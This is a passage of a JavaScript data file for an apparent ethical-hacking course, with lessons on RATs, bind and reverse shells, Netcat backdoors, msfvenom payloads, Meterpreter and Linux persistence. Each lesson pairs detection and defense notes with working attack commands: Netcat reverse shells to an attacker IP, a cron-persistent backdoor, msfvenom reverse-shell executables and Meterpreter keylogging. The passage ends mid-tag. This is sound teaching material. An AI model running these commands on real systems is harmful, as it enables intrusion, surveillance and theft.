                    <li>Use EDR/XDR solutions</li>
                    <li>Enable system and network logging</li>
                    <li>Perform regular integrity checks</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Remote Access Trojans (RATs)',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Remote Access Trojans (RATs)</h2>
          <p class="mb-4 text-gray-300">
            A Remote Access Trojan (RAT) is a type of malware that allows an attacker to remotely control a victim’s system as if they were physically present. Unlike simple backdoors that may only provide command execution, RATs offer full administrative-style control, including screen viewing, file management, keystroke logging, webcam/microphone access, and command execution.
          </p>
          <p class="mb-4 text-gray-300">
            RATs are commonly delivered through phishing emails, malicious downloads, cracked software, fake updates, or social engineering attacks. Once executed, the RAT silently installs itself and establishes a command-and-control (C2) connection with the attacker’s server. This connection is often encrypted or disguised as legitimate traffic to evade detection.
          </p>
          <p class="mb-4 text-gray-300">
            One of the most dangerous aspects of RATs is their stealth and persistence. They frequently:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Rename themselves to look like legitimate system files</li>
            <li>Hide as background services or startup tasks</li>
            <li>Disable or bypass security software</li>
            <li>Reconnect automatically after reboot</li>
          </ul>
          <p class="mb-4 text-gray-300">
            RATs are widely used in espionage, data theft, surveillance, financial fraud, and long-term system compromise. In advanced attacks, RATs act as the foundation for post‑exploitation, allowing attackers to deploy additional tools, escalate privileges, and move laterally inside a network.
          </p>
          <p class="mb-4 text-gray-300">
            From a cyber security learning perspective, understanding RATs is essential to recognize real‑world attack behavior, improve detection strategies, and strengthen endpoint defenses.
          </p>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Common Capabilities of RATs</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Remote command execution</li>
              <li>File upload and download</li>
              <li>Screen capture and live monitoring</li>
              <li>Keylogging and clipboard monitoring</li>
              <li>Webcam and microphone access</li>
              <li>Credential harvesting</li>
              <li>Persistence and auto‑reconnect</li>
            </ul>
          </div>
        `,
        syntax: [
          {
            title: 'RAT Detection & Defensive Analysis',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">RAT Detection & Defensive Analysis</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands shown are for analysis, monitoring, and defense only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ss -antp</code>
                      <p class="text-sm text-gray-400">Identify Suspicious Network Connections. Look for unknown outbound connections to external IPs.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">tcpdump -i eth0</code>
                      <p class="text-sm text-gray-400">Monitor Real-Time Network Traffic. Used to observe abnormal or continuous beaconing behavior.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">top</code>
                      <p class="text-sm text-gray-400">Check Running Background Processes. Helps identify hidden or resource‑abusing processes.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ls /etc/rc*.d/</code>
                      <p class="text-sm text-gray-400">Check Auto-Start Locations (Linux). Detects unauthorized startup scripts.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">strings suspicious_file</code>
                      <p class="text-sm text-gray-400">Analyze Binary Behavior (Static Analysis). Reveals hardcoded IPs, domains, or commands.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">sha256sum suspicious_file</code>
                      <p class="text-sm text-gray-400">File Hash Verification. Used to compare against malware databases.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">How RATs Are Detected</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Unusual outbound traffic patterns</li>
                    <li>High privilege processes running without justification</li>
                    <li>Unknown startup services</li>
                    <li>Unexpected access to camera or microphone</li>
                    <li>Behavioral alerts from EDR tools</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Bind Shells vs Reverse Shells',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Bind Shells vs Reverse Shells</h2>
          <p class="mb-4 text-gray-300">
            A shell is an interface that allows a user to execute commands on a system. In cyber security and penetration testing, shells are often used after an initial compromise to gain interactive control over a target machine. Two of the most important shell types you must clearly understand are Bind Shells and Reverse Shells. While both achieve remote command execution, they differ significantly in connection direction, firewall behavior, detectability, and real‑world usage.
          </p>
          <p class="mb-4 text-gray-300">
            A Bind Shell works by opening a listening port on the victim machine. The attacker then connects directly to this open port to gain access. This method is simple and straightforward but has a major weakness: most systems are protected by firewalls that block incoming connections. Because of this, bind shells are often ineffective in modern networks unless firewall rules are misconfigured or already compromised.
          </p>
          <p class="mb-4 text-gray-300">
            In contrast, a Reverse Shell flips the connection direction. Instead of the attacker connecting to the victim, the victim system initiates the connection back to the attacker. This technique is far more successful in real‑world scenarios because outbound connections are usually allowed by firewalls. Reverse shells are therefore the preferred method in penetration testing, red‑team operations, and malware payloads.
          </p>
          <p class="mb-4 text-gray-300">
            From a defensive point of view, understanding these shell types helps security professionals detect abnormal outbound connections, suspicious listening ports, and post‑exploitation behavior.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Key Differences Explained</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Bind Shell</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Victim opens a listening port</li>
                <li>Attacker connects to victim</li>
                <li>Blocked by firewalls easily</li>
                <li>Simple but less reliable</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Reverse Shell</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Attacker listens for connection</li>
                <li>Victim connects back to attacker</li>
                <li>Bypasses firewall restrictions</li>
                <li>Widely used in real attacks</li>
              </ul>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Real‑World Usage Context</h4>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h5 class="text-white font-semibold mb-1">Bind Shells</h5>
                <ul class="list-disc list-inside text-gray-300 space-y-1">
                  <li>Internal network attacks</li>
                  <li>Misconfigured servers</li>
                  <li>Lab environments</li>
                </ul>
              </div>
              <div>
                <h5 class="text-white font-semibold mb-1">Reverse Shells</h5>
                <ul class="list-disc list-inside text-gray-300 space-y-1">
                  <li>Exploit payloads</li>
                  <li>Metasploit sessions</li>
                  <li>RATs and backdoors</li>
                  <li>Phishing‑based compromises</li>
                </ul>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: Netcat (nc)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Netcat (nc) Shells</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands shown are for ethical labs, learning, and defensive understanding only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Bind Shell Examples</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc -lvp 4444 -e /bin/bash</code>
                      <p class="text-sm text-gray-400"><strong>Victim Side:</strong> Opens port 4444, attaches bash shell, waits for connection.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc &lt;victim_ip&gt; 4444</code>
                      <p class="text-sm text-gray-400"><strong>Attacker Side:</strong> Connects directly to victim. Requires open inbound port.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Reverse Shell Examples</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc -lvp 4444</code>
                      <p class="text-sm text-gray-400"><strong>Attacker Side (Listener):</strong> Attacker waits for incoming connection.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc &lt;attacker_ip&gt; 4444 -e /bin/bash</code>
                      <p class="text-sm text-gray-400"><strong>Victim Side:</strong> Initiates outbound connection. Bypasses firewall restrictions.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection & Defense Perspective</h4>
                  <p class="text-gray-300 mb-2">Security teams detect shells by monitoring:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Unexpected listening ports</li>
                    <li>Outbound connections to unknown IPs</li>
                    <li>Processes spawning shells unexpectedly</li>
                    <li>Long‑lived TCP sessions</li>
                  </ul>
                  <p class="text-gray-300 mb-2">Common defenses include:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Egress traffic filtering</li>
                    <li>Application whitelisting</li>
                    <li>Endpoint Detection & Response (EDR)</li>
                    <li>Network Intrusion Detection Systems (NIDS)</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Netcat Backdoor Techniques',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Netcat Backdoor Techniques</h2>
          <p class="mb-4 text-gray-300">
            A backdoor is a hidden method of accessing a system that bypasses normal authentication and security mechanisms. In post‑exploitation scenarios, attackers often install backdoors to maintain long‑term access to a compromised machine. One of the simplest and most powerful tools used to demonstrate backdoor concepts is Netcat, often referred to as the “Swiss Army knife of networking.”
          </p>
          <p class="mb-4 text-gray-300">
            Netcat backdoors are lightweight, fast, and extremely flexible. They do not require complex payloads or large binaries, which makes them difficult to detect when compared to advanced malware. Using Netcat, an attacker can create persistent listening services, spawn command shells, transfer files, and tunnel traffic through a compromised system.
          </p>
          <p class="mb-4 text-gray-300">
            In real‑world attacks, Netcat is commonly used after initial exploitation to establish a stable control channel. While modern security solutions can detect suspicious Netcat usage, misconfigured systems, legacy servers, and poorly monitored environments are still vulnerable. From a defensive standpoint, learning Netcat backdoor techniques helps security professionals understand how attackers maintain access and how to break that access.
          </p>
          <p class="mb-4 text-gray-300">
            Netcat backdoors can be classified into:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li><strong>Temporary backdoors:</strong> exist until reboot</li>
            <li><strong>Semi‑persistent backdoors:</strong> triggered via scripts or cron jobs</li>
            <li><strong>Fileless backdoors:</strong> run directly in memory</li>
          </ul>
          <p class="mb-4 text-gray-300">
            Because Netcat operates at the network level, it can evade basic antivirus solutions and rely on native system tools, making detection harder without proper monitoring.
          </p>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Why Netcat Is Dangerous</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>It does not require installation</li>
              <li>It uses standard TCP/UDP traffic</li>
              <li>It can spawn system shells</li>
              <li>It blends with legitimate network activity</li>
            </ul>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: Netcat (nc)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Netcat (nc) Backdoor Commands</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands shown are for ethical labs, penetration testing practice, and defensive understanding only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Backdoor Creation & Usage</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc -lvp 5555 -e /bin/bash</code>
                      <p class="text-sm text-gray-400">Simple Netcat Backdoor (Listening Shell). Opens port 5555, spawns bash shell, grants remote execution.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc &lt;target_ip&gt; 5555</code>
                      <p class="text-sm text-gray-400">Connecting to the Backdoor (Attacker Side). Attacker gains shell access.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">(crontab -l; echo "@reboot nc -lvp 5555 -e /bin/bash") | crontab -</code>
                      <p class="text-sm text-gray-400">Persistent Backdoor Using Cron (Linux). Backdoor runs on every reboot.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc &lt;attacker_ip&gt; 4444 -e /bin/bash</code>
                      <p class="text-sm text-gray-400">Reverse Shell Backdoor (Stealthier Method). Victim initiates connection, bypassing firewall.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">File Transfer Using Netcat</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc -lvp 7777 > secret.txt</code>
                      <p class="text-sm text-gray-400"><strong>Receiver:</strong> Listens on port 7777 and writes output to secret.txt.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nc &lt;receiver_ip&gt; 7777 &lt; secret.txt</code>
                      <p class="text-sm text-gray-400"><strong>Sender:</strong> Connects to receiver and sends file content.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection & Mitigation</h4>
                  <p class="text-gray-300 mb-2">Security teams can detect Netcat backdoors by:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Monitoring unknown listening ports</li>
                    <li>Detecting suspicious cron jobs</li>
                    <li>Watching outbound reverse shell traffic</li>
                    <li>Blocking unauthorized binaries</li>
                  </ul>
                  <p class="text-gray-300 mb-2">Mitigation techniques include:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Application control policies</li>
                    <li>Network segmentation</li>
                    <li>EDR behavioral monitoring</li>
                    <li>Restricting cron & startup scripts</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'msfvenom Payload Creation',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">msfvenom Payload Creation</h2>
          <p class="mb-4 text-gray-300">
            msfvenom is a powerful payload generation tool that is part of the Metasploit Framework. It is widely used in ethical hacking, penetration testing, and red‑team exercises to create custom payloads that can be delivered after exploiting a vulnerability. In simple terms, msfvenom allows a security tester to generate a file or command that, when executed on a target system, establishes control such as a reverse shell, bind shell, or Meterpreter session.
          </p>
          <p class="mb-4 text-gray-300">
            Earlier versions of Metasploit used separate tools like msfpayload and msfencode, but msfvenom unified both into a single, efficient utility. This makes payload creation faster, cleaner, and more flexible. msfvenom supports multiple platforms including Linux, Windows, Android, macOS, and various architectures such as x86 and x64.
          </p>
          <p class="mb-4 text-gray-300">
            From a learning and defensive perspective, understanding msfvenom is critical because many real‑world malware samples and post‑exploitation tools rely on similar payload concepts. Security professionals must know how payloads are structured, delivered, and executed in order to detect, analyze, and block them.
          </p>
          
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Payload Creation Steps</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Choosing a payload type</li>
              <li>Selecting attacker IP and port</li>
              <li>Choosing output format</li>
              <li>Encoding or obfuscation (optional)</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Common Use Cases</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Exploit chaining</li>
              <li>Phishing demonstrations (ethical labs)</li>
              <li>Backdoor deployment</li>
              <li>Red‑team simulations</li>
            </ul>
          </div>

          <h4 class="text-lg font-semibold text-white mb-2">Important Concepts</h4>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
              <h5 class="text-white font-semibold mb-1">Payload</h5>
              <p class="text-sm text-gray-400">A small piece of code executed after exploitation to gain control.</p>
            </div>
            <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
              <h5 class="text-white font-semibold mb-1">Staged Payload</h5>
              <p class="text-sm text-gray-400">Downloads additional components after initial execution.</p>
            </div>
            <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
              <h5 class="text-white font-semibold mb-1">Stageless Payload</h5>
              <p class="text-sm text-gray-400">Contains everything in a single file, larger but more reliable.</p>
            </div>
            <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
              <h5 class="text-white font-semibold mb-1">Meterpreter</h5>
              <p class="text-sm text-gray-400">An advanced payload that runs in memory and provides powerful post‑exploitation features.</p>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: msfvenom',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">msfvenom Payload Commands</h4>
                  <p class="text-gray-300 mb-4">⚠️ All commands are for ethical labs, learning environments, and defensive awareness only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Payload Generation Examples</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">msfvenom -l payloads</code>
                      <p class="text-sm text-gray-400"><strong>List Available Payloads:</strong> Displays all supported payloads. Helps choose correct OS and architecture.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf</code>
                      <p class="text-sm text-gray-400"><strong>Linux Reverse Shell Payload:</strong> Creates Linux ELF executable. Used for Linux systems.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > backdoor.exe</code>
                      <p class="text-sm text-gray-400"><strong>Windows Reverse Shell Payload:</strong> Creates Windows executable. Uses Meterpreter session. Common in controlled demos.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o app.apk</code>
                      <p class="text-sm text-gray-400"><strong>Android Payload Example:</strong> Generates Android APK. Used in mobile security labs.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Start Metasploit Listener</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <div class="text-green-400 font-mono text-sm mb-2">
                      <p>msfconsole</p>
                      <p>use exploit/multi/handler</p>
                      <p>set payload windows/x64/meterpreter/reverse_tcp</p>
                      <p>set LHOST 192.168.1.10</p>
                      <p>set LPORT 4444</p>
                      <p>run</p>
                    </div>
                    <p class="text-sm text-gray-400">Waits for incoming payload connection. Establishes session control.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection & Defense Perspective</h4>
                  <p class="text-gray-300 mb-2">Security teams detect msfvenom‑based payloads by:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Behavioral analysis (EDR)</li>
                    <li>Suspicious outbound connections</li>
                    <li>Memory‑based payload execution</li>
                    <li>Known payload signatures</li>
                  </ul>
                  <p class="text-gray-300 mb-2">Defensive measures include:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Application whitelisting</li>
                    <li>Execution prevention policies</li>
                    <li>Network egress filtering</li>
                    <li>Regular threat hunting</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Meterpreter Backdoor Sessions',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Meterpreter Backdoor Sessions</h2>
          <p class="mb-4 text-gray-300">
            Meterpreter is one of the most advanced and powerful payloads available in the Metasploit Framework. Unlike traditional command‑line shells, Meterpreter operates entirely in memory, which means it does not write files to disk by default. This makes it stealthier, harder to detect, and extremely effective for post‑exploitation activities. Because of this behavior, Meterpreter is commonly associated with backdoors, advanced persistent threats (APTs), and red‑team operations.
          </p>
          <p class="mb-4 text-gray-300">
            A Meterpreter backdoor session is established after a successful exploit or payload execution. Once the session is active, the attacker gains deep control over the compromised system without spawning a visible shell. Meterpreter communicates over encrypted channels and supports a wide range of capabilities such as file manipulation, process migration, credential dumping, screenshot capture, keylogging, privilege escalation, and lateral movement.
          </p>
          <p class="mb-4 text-gray-300">
            One of the key strengths of Meterpreter is its modular architecture. Commands can be loaded dynamically, meaning the attacker only uses what is needed, reducing the footprint on the target system. This also allows Meterpreter to adapt to different operating systems and environments, including Windows, Linux, and Android.
          </p>
          <p class="mb-4 text-gray-300">
            From a defensive perspective, understanding Meterpreter is critical because many real‑world attacks rely on fileless malware techniques similar to it. Security teams must focus on behavioral detection, memory analysis, and network traffic inspection rather than relying solely on signature‑based antivirus solutions.
          </p>
          
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Why Meterpreter Is Considered Dangerous</h4>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h5 class="text-white font-semibold mb-1">Key Capabilities</h5>
                <ul class="list-disc list-inside text-gray-300 space-y-1">
                  <li>It runs in memory (fileless execution)</li>
                  <li>It uses encrypted communication</li>
                  <li>It supports privilege escalation</li>
                  <li>It enables long‑term persistence</li>
                  <li>It avoids traditional logging</li>
                </ul>
              </div>
              <div>
                <h5 class="text-white font-semibold mb-1">Ideal For</h5>
                <ul class="list-disc list-inside text-gray-300 space-y-1">
                  <li>Advanced backdoors</li>
                  <li>Red‑team simulations</li>
                  <li>Post‑exploitation control</li>
                  <li>Lateral movement within networks</li>
                </ul>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: Metasploit (Meterpreter)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Meterpreter Commands</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands are for ethical hacking labs, education, and defensive understanding only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Starting & Handling Sessions</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">msfconsole</code>
                      <p class="text-sm text-gray-400"><strong>Start Metasploit Framework:</strong> Launches Metasploit. Required to handle Meterpreter sessions.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="text-green-400 font-mono text-sm mb-2">
                        <p>use exploit/multi/handler</p>
                        <p>set payload windows/x64/meterpreter/reverse_tcp</p>
                        <p>set LHOST 192.168.1.10</p>
                        <p>set LPORT 4444</p>
                        <p>run</p>
                      </div>
                      <p class="text-sm text-gray-400"><strong>Set Up Meterpreter Listener:</strong> Waits for Meterpreter connection. Handles reverse payloads.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">sessions</code>
                      <p class="text-sm text-gray-400"><strong>View Active Sessions:</strong> Lists all active Meterpreter sessions.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">sessions -i 1</code>
                      <p class="text-sm text-gray-400"><strong>Interact with a Session:</strong> Opens interactive Meterpreter shell.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Common Meterpreter Commands</h4>
                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">sysinfo</code>
                      <p class="text-sm text-gray-400">Displays system information.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">getuid</code>
                      <p class="text-sm text-gray-400">Shows current user privileges.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ps</code>
                      <p class="text-sm text-gray-400">Lists running processes.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">migrate &lt;pid&gt;</code>
                      <p class="text-sm text-gray-400">Moves session to another process.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">screenshot</code>
                      <p class="text-sm text-gray-400">Captures screen image.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">keyscan_start</code>
                      <p class="text-sm text-gray-400">Starts keylogging.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">download file.txt</code>
                      <p class="text-sm text-gray-400">Downloads file from target.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Persistence (Conceptual Example)</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono">run persistence -X -i 60 -p 4444 -r 192.168.1.10</code>
                    <p class="text-sm text-gray-400">Attempts persistence on reboot. Frequently detected in real environments.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection & Defense Perspective</h4>
                  <p class="text-gray-300 mb-2">Meterpreter detection relies on:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Behavioral monitoring (EDR/XDR)</li>
                    <li>Memory scanning</li>
                    <li>Abnormal process migration</li>
                    <li>Encrypted outbound connections</li>
                  </ul>
                  <p class="text-gray-300 mb-2">Defensive measures include:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Blocking suspicious PowerShell usage</li>
                    <li>Enforcing least privilege</li>
                    <li>Network segmentation</li>
                    <li>Monitoring post‑exploitation activity</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Persistence Mechanisms in Linux',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Persistence Mechanisms in Linux</h2>
          <p class="mb-4 text-gray-300">
            Persistence refers to techniques used by attackers to maintain access to a compromised system even after reboots, user logouts, or service restarts. In Linux environments, persistence is often achieved by abusing legitimate system features such as startup scripts, scheduled tasks, services, and user configuration files. Because these mechanisms are native to the operating system, they can be difficult to detect if security monitoring is weak.
          </p>
          <p class="mb-4 text-gray-300">
            Linux persistence mechanisms are widely used in real‑world attacks, malware campaigns, cryptominers, and APT operations. Attackers prefer Linux persistence because servers often run continuously, receive less endpoint monitoring than desktops, and host critical infrastructure. Once persistence is established, an attacker can return to the system at any time, escalate privileges, move laterally, or exfiltrate data.
          </p>
          <p class="mb-4 text-gray-300">
            From a defensive perspective, understanding Linux persistence is crucial for incident response and threat hunting. Security teams must know where attackers hide, which files are commonly abused, and how persistence survives system restarts. Most Linux persistence techniques rely on misconfigured permissions, excessive privileges, or lack of integrity monitoring.
          </p>
          
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Common Persistence Vectors</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Cron jobs and scheduled tasks</li>
              <li>Systemd services</li>
              <li>Startup scripts</li>
              <li>User shell configuration files</li>
              <li>SSH key abuse</li>
              <li>Kernel modules (advanced attacks)</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Why Linux Persistence Is Effective</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Linux trusts configuration files</li>
              <li>Startup mechanisms are flexible</li>
              <li>Services run with high privileges</li>
              <li>Admins rarely audit cron and services</li>
            </ul>
            <p class="mt-2 text-gray-400 text-sm">Attackers often combine persistence with reverse shells or Meterpreter sessions to regain access silently.</p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: Cron & Systemd',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Persistence Commands</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands are for ethical labs, education, and defensive learning only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Persistence via Cron Jobs</h4>
                  <p class="text-gray-300 mb-2">Cron allows commands to run automatically at scheduled times.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
